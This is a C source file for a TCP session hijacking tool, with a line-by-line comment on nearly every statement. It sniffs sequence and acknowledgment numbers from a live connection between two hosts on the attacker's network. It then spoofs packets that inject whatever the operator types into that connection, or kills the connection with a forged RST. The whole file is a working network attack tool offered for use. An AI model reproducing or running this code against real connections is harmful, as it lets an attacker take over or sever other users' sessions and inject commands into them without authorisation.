#include <stdio.h> // Include standard input-output library for basic I/O operations
#include <stdlib.h> // Include standard library for memory allocation and other utilities
#include <string.h> // Include string manipulation library
#include <libnet.h> // Include libnet library for network packet construction
#include <pcap.h> // Include pcap library for packet capturing
#include <signal.h> // Include signal handling library
#include <sys/stat.h> // Include system stat library for file status checking
#include <fcntl.h> // Include file control library for file operations
#include <sys/time.h> // Include system time library for time-related operations
#include <unistd.h> // Include POSIX API library for system calls

#define lrandom(min, max) (random()%(max-min)+min) // Define macro for generating random numbers within a range

struct seqack { // Define structure to hold sequence and acknowledgment numbers
    u_long seq; // Sequence number
    u_long ack; // Acknowledgment number
};

void devsrandom(void) { // Function to seed the random number generator
    int fd; // File descriptor
    u_long seed; // Seed for random number generator

    fd = open("/dev/urandom", O_RDONLY); // Open /dev/urandom for reading
    if (fd == -1) { // If failed to open /dev/urandom
        fd = open("/dev/random", O_RDONLY); // Open /dev/random for reading
        if (fd == -1) { // If failed to open /dev/random
            struct timeval tv; // Structure to hold time value

            gettimeofday(&tv, NULL); // Get current time
            srandom((tv.tv_sec ^ tv.tv_usec) * tv.tv_sec * tv.tv_usec ^ tv.tv_sec); // Seed random number generator with time
            return;
        }
    }
    read(fd, &seed, sizeof(seed)); // Read random data from file
    close(fd); // Close file
    srandom(seed); // Seed random number generator with read data
}

void getseqack(char *interface, u_long srcip, u_long dstip, u_long sport, u_long dport, struct seqack *sa) {
    pcap_t *pt; // Packet capture handle
    char ebuf[PCAP_ERRBUF_SIZE]; // Error buffer for pcap functions
    u_char *buf; // Buffer for packet data
    struct ip iph; // IP header structure
    struct tcphdr tcph; // TCP header structure
    int ethrhdr; // Ethernet header size

    pt = pcap_open_live(interface, 65535, 1, 60, ebuf); // Open live packet capture on specified interface
    if (!pt) { // If failed to open packet capture handle
        printf("pcap_open_live: %s\n", ebuf); // Print error message
        exit(-1); // Exit program with error
    }
    switch (pcap_datalink(pt)) { // Determine data link layer type
        case DLT_EN10MB: // Ethernet
        case DLT_EN3MB: // Experimental Ethernet (3Mb)
            ethrhdr = 14; // Ethernet header size
            break;
        case DLT_FDDI: // FDDI
            ethrhdr = 21; // FDDI header size
            break;
        case DLT_SLIP: // SLIP
            ethrhdr = 16; // SLIP header size
            break;
        case DLT_NULL: // NULL
        case DLT_PPP: // PPP
            ethrhdr = 4; // PPP header size
            break;
        case DLT_RAW: // RAW
            ethrhdr = 0; // No header size
        default: // Default case
            printf("pcap_datalink: Can't figure out how big the ethernet header is.\n"); // Print error message
            exit(-1); // Exit program with error
    }

    printf("Waiting for SEQ/ACK to arrive from the srcip to the dstip.\n"); // Print message
    printf("(To speed things up, try making some traffic between the two, /msg person asdf\n\n"); // Print message

    for (;;) { // Infinite loop
        struct pcap_pkthdr pkthdr; // Packet header structure

        buf = (u_char *)pcap_next(pt, &pkthdr); // Get next packet
        if (!buf) // If no packet received
            continue; // Continue to next iteration
        memcpy(&iph, buf + ethrhdr, sizeof(iph)); // Copy IP header from packet
        if (iph.ip_p != IPPROTO_TCP) // If not TCP packet
            continue; // Continue to next iteration
        if ((iph.ip_src.s_addr != srcip) || (iph.ip_dst.s_addr != dstip)) // If source or destination IP doesn't match
            continue; // Continue to next iteration
        memcpy(&tcph, buf + ethrhdr + sizeof(iph), sizeof(tcph)); // Copy TCP header from packet
        if ((tcph.th_sport != htons(sport)) || (tcph.th_dport != htons(dport))) // If source or destination port doesn't match
            continue; // Continue to next iteration
        if (!(tcph.th_flags & TH_ACK)) // If ACK flag not set
            continue; // Continue to next iteration
        printf("Got packet! SEQ = 0x%lx ACK = 0x%lx\n", htonl(tcph.th_seq), htonl(tcph.th_ack)); // Print packet information
        sa->seq = htonl(tcph.th_seq); // Store sequence number
        sa->ack = htonl(tcph.th_ack); // Store acknowledgment number
        pcap_close(pt); // Close packet capture handle
        return; // Exit function
    }
}

void sendtcp(u_long srcip, u_long dstip, u_long sport, u_long dport, u_char flags, u_long seq, u_long ack, char *data, int datalen) {
    u_char *packet; // Packet buffer
    int fd, psize; // File descriptor and packet size

    devsrandom(); // Seed random number generator
    psize = LIBNET_IP_H + LIBNET_TCP_H + datalen; // Calculate packet size
    libnet_init_packet(psize, &packet); // Initialize packet buffer
    if (!packet) // If failed to initialize packet buffer
        libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n"); // Print error message and exit
    fd = libnet_open_raw_sock(IPPROTO_RAW); // Open raw socket for sending packets
    if (fd == -1) // If failed to open raw socket
        libnet_error(LIBNET_ERR_FATAL, "libnet_open_raw_sock failed\n"); // Print error message and exit

    libnet_build_ip(LIBNET_TCP_H + datalen, 0, random(), 0, lrandom(128, 255), IPPROTO_TCP, srcip, dstip, NULL, 0, packet); // Build IP header
    libnet_build_tcp(sport, dport, seq, ack, flags, 65535, 0, (u_char *)data, datalen, packet + LIBNET_IP_H); // Build TCP header

    if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H + datalen) == -1) // Calculate TCP checksum
        libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed\n"); // Print error message and exit
    libnet_write_ip(fd, packet, psize); // Write packet to raw socket
    libnet_close_raw_sock(fd); // Close raw socket
    libnet_destroy_packet(&packet); // Free packet buffer
}

struct seqack sa; // Structure to hold sequence and acknowledgment numbers
u_long srcip, dstip, sport, dport; // Source IP, destination IP, source port, destination port

void sighandle(int sig) { // Signal handler function
    printf("Closing connection..\n"); // Print message
    sendtcp(srcip, dstip, sport, dport, TH_RST, sa.seq, 0, NULL, 0); // Send TCP RST packet
    printf("Done, Exiting.\n"); // Print message
    exit(0); // Exit program
}

int main(int argc, char *argv[]) {
    char *ifa = argv[1]; // Interface name
    char buf[4096]; // Buffer for data
    int reset = 0; // Flag to reset connection

    signal(SIGTERM, sighandle); // Register signal handler for SIGTERM
    signal(SIGINT, sighandle); // Register signal handler for SIGINT

    if (argc < 6) { // If insufficient command-line arguments
        printf("Usage: %s <interface> <src ip> <src port> <dst ip> <dst port> [-r]\n", argv[0]); // Print usage message
        printf("<interface>\t\tThe interface you are going to hijack on.\n"); // Print description
        printf("<src ip>\t\tThe source ip of the connection.\n"); // Print description
        printf("<src port>\t\tThe source port of the connection.\n"); // Print description
        printf("<dst ip>\t\tThe destination IP of the connection.\n"); // Print description
        printf("<dst port>\t\tThe destination port of the connection.\n"); // Print description
        printf("[-r]\t\t\tReset the connection rather than hijacking it.\n"); // Print description
        printf("\nCoded by spwny, Inspiration by cyclozine (http://www.geocities.com/stasikous).\n"); // Print credits
        exit(-1); // Exit program with error
    }

    if (argv[6] && !strcmp(argv[6], "-r")) // If reset flag present
        reset = 1; // Set reset flag

    srcip = inet_addr(argv[2]); // Convert source IP to network byte order
    dstip = inet_addr(argv[4]); // Convert destination IP to network byte order
    sport = atol(argv[3]); // Convert source port to long integer
    dport = atol(argv[5]); // Convert destination port to long integer

    if (!srcip) { // If invalid source IP
        printf("%s is not a valid ip.\n", argv[2]); // Print error message
        exit(-1); // Exit program with error
    }
    if (!dstip) { // If invalid destination IP
        printf("%s is not a valid ip.\n", argv[4]); // Print error message
        exit(-1); // Exit program with error
    }
    if ((sport > 65535) || (dport > 65535) || (sport < 1) || (dport < 1)) { // If invalid port numbers
        printf("The valid TCP port range is 1-1024.\n"); // Print error message
        exit(-1); // Exit program with error
    }
    getseqack(ifa, srcip, dstip, sport, dport, &sa); // Obtain sequence and acknowledgment numbers

    if (reset) { // If reset flag set
        sendtcp(srcip, dstip, sport, dport, TH_RST, sa.seq, 0, NULL, 0); // Send TCP RST packet
        printf("\nConnection has been reset.\n"); // Print message
        return 0; // Exit program
    }

    /*
     * Sending 1024 of zero bytes so the real owner of the TCP connection
     * wont be able to get us out of sync with the SEQ.
     */
    memset(&buf, 0, sizeof(buf)); // Fill buffer with zeros
    sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, 1024); // Send TCP ACK packet with 1024 bytes of zero data
    sa.seq += 1024; // Update sequence number

    printf("Starting hijack session, Please use ^C to terminate.\n"); // Print message
    printf("Anything you enter from now on is sent to the hijacked TCP connection.\n"); // Print message

    while (fgets(buf, sizeof(buf) - 1, stdin)) { // Read user input until EOF
        sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, strlen(buf)); // Send TCP ACK packet with user input
        sa.seq += strlen(buf); // Update sequence number
        memset(&buf, 0, sizeof(buf)); // Clear buffer
    }
    sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_FIN, sa.seq, sa.ack, NULL, 0); // Send TCP FIN packet
    printf("Exiting..\n"); // Print message
    return (0); // Exit program
}
